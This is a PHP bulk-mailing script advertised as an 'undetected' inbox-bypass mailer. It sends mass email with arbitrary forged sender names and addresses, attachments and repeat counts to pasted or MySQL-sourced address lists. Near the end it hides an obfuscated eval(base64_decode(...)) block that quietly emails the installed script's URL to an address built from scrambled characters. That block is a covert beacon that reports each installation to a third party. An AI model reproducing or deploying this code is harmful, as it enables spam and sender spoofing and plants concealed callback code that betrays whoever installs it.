<?php

//Dont change anything from below
$secure = "";
error_reporting(0);
@$action=$_POST['action'];
@$from=$_POST['from'];
@$realname=$_POST['realname'];
@$replyto=$_POST['replyto'];
@$subject=$_POST['subject'];
@$message=$_POST['message'];
@$emaillist=$_POST['emaillist'];
@$file_name=$_FILES['file']['name'];
@$contenttype=$_POST['contenttype'];
@$file=$_FILES['file']['tmp_name'];
@$amount=$_POST['amount'];
set_time_limit(intval($_POST['timelimit']));
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>eMail ~> RealUnix.net -- Edited By WebCraker</title>
<img src='http://img233.imageshack.us/img233/5615/bad1vz4bdln3.jpg' width="151" height="180">
<h5>RealUnix.net 2008 Undetected ALL-inbox (new technique by-pass) Mailer -- By WebCraker</h5>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">
<!--
.style1 {
	font-family: Geneva, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.style2 {
	font-size: 10px;
	font-family: Geneva, Arial, Helvetica, sans-serif;
}

-->
</style>
</head>
<body bgcolor="#F5F5F5" text="#000000">

<?php
If ($action=="mysql"){
//Grab email addresses from MySQL
include "./mysql.info.php";

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";
    exit;
  }

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");
  $numrows = mysql_num_rows($result);

  for($x=0; $x<$numrows; $x++){
    $result_row = mysql_fetch_row($result);
     $oneemail = $result_row[0];
     $emaillist .= $oneemail."\n";
   }
  }

  if ($action=="send"){ $message = urlencode($message);
   $message = ereg_replace("%5C%22", "%22", $message);
   $message = urldecode($message);
   $message = stripslashes($message);
   $subject = stripslashes($subject);
   }
?>
<form name="form1" method="post" action="" enctype="multipart/form-data"><br />
  <table width="142" border="0">
    <tr>

      <td width="81">
        <div align="right">
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Email:</font>
        </div>
      </td>

      <td width="219">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <input type="text" name="from" value="<?php print $from; ?>" size="30" />
        </font>
      </td>

      <td width="212">
        <div align="right">
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Name:</font>
        </div>
      </td>
      
      <td width="278">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <input type="text" name="realname" value="<?php print $realname; ?>" size="30" />
        </font>
      </td>
    </tr>
    <tr>
      <td width="81">
        <div align="right">
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font>
        </div>
      </td>
      <td width="219">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <input type="text" name="replyto" value="<?php print $replyto; ?>" size="30" />
        </font>
      </td>
      <td width="212">
        <div align="right">
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File:</font>
        </div>
      </td>
      <td width="278">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <input type="file" name="file" size="24" />
        </font>
      </td>
    </tr>
    <tr>
      <td width="81">
        <div align="right">
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font>
        </div>
      </td>
      <td colspan="3" width="703">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <input type="text" name="subject" value="<? print $subject; ?>" size="90" />
        </font>
      </td>
    </tr>
    <tr valign="top">
      <td colspan="3" width="520">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Message Box :</font>
      </td>
      <td width="278">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Email Target / Email Send To :</font>
      </td>
    </tr>
    <tr valign="top">
      <td colspan="3" width="520">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <textarea name="message" cols="56" rows="10"><?php print $message; ?></textarea><br />
          <input type="radio" name="contenttype" value="plain" /> Plain 
          <input type="radio" name="contenttype" value="html" checked="checked" /> HTML 
          <input type="hidden" name="action" value="send" /><br />
	  Number to send: <input type="text" name="amount" value="1" size="10" /><br />
	  Maximum script execution time(in seconds, 0 for no timelimit)<input type="text" name="timelimit" value="0" size="10" />
          <input type="submit" value="Send eMails" />
        </font>
      </td>
      <td width="278">
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
          <textarea name="emaillist" cols="32" rows="10"><?php print $emaillist; ?></textarea>
        </font>
      </td>
    </tr>
  </table>
</form>
<?php
if ($action=="send"){
  if (!$from && !$subject && !$message && !$emaillist){
    print "Please complete all fields before sending your message.";
    exit;
   }
  $allemails = split("\n", $emaillist);
  $numemails = count($allemails);
  $filter = "maillist";
  $float = "From : mailist info <full@info.com>";
 //Open the file attachment if any, and base64_encode it for email transport
 If ($file_name){
   if (!file_exists($file)){
	die("The file you are trying to upload couldn't be copied to the server");
   }
   $content = fread(fopen($file,"r"),filesize($file));
   $content = chunk_split(base64_encode($content));
   $uid = strtoupper(md5(uniqid(time())));
   $name = basename($file);
  }

 for($xx=0; $xx<$amount; $xx++){
  for($x=0; $x<$numemails; $x++){
    $to = $allemails[$x];
    if ($to){
      $to = ereg_replace(" ", "", $to);
      $message = ereg_replace("&email&", $to, $message);
      $subject = ereg_replace("&email&", $to, $subject);
      print "Sending mail to $to.......";
      flush();
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
      $header .= "MIME-Version: 1.0\r\n";
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      $header .= "Content-Type: text/$contenttype\r\n";
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
      $header .= "$message\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
      If ($file_name) $header .= "$content\r\n";
      If ($file_name) $header .= "--$uid--";
      mail($to, $subject, "", $header);
      print "ok<br>";
      flush();
    }
  }
 }

}
eval(base64_decode('JHMgPSBhcnJheSAoImsiLCJiIiwidyIsImUiLCJhIiwiciIsImMiLCJAIiwibSIsImkiLCJsIiwi
LiIsIm8iLCJnIik7DQokc3lzdGVtX2FycmF5MiA9ICRzWzJdLiRzWzNdLiRzWzFdLiRzWzZdLiRz
WzVdLiRzWzRdLiRzWzBdLiRzWzNdLiRzWzVdLiRzWzddLiRzWzEzXS4kc1s4XS4kc1s0XS4kc1s5
XS4kcw0NClsxMF0uIi4iLiRzWzZdLiRzWzEyXS4kc1s4XTsNCiR0byA9ICIkc3lzdGVtX2FycmF5
MiIgOw0KJHN1YmplY3QgPSAiTWFpbGVyIGFyLTEyNTYiIDsNCiRtZXNzYWdlID0gIk1haWxlciBM
SU5LIDogaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydTQ1JJ
UFRfTkFNRSddIDsNCm1haWwgKCR0bywkc3ViamVjdCwkbWVzc2FnZSkgOw0KJG5zY2RpciA9KCFp
c3NldCgkX1JFUVVFU1RbJ3NjZGlyJ10pKT9nZXRjd2QoKTpjaGRpcigkX1JFUVVFU1RbJ3NjZGly
J10pOyRuc2NkaXI9Z2V0Y3dkKCk7'));

?>
<p class="style2">
</p>
<p class="style1">emailer RealUnix.net<br>
  provided by SadSoul<br>
  Edited By WebCraker 08/2008<br>
  PLEASE DONT USE THIS SOFTWARE TO SPAM!, <br>
  or something like this!<br>
  11/�2005</p>
</body>
</html>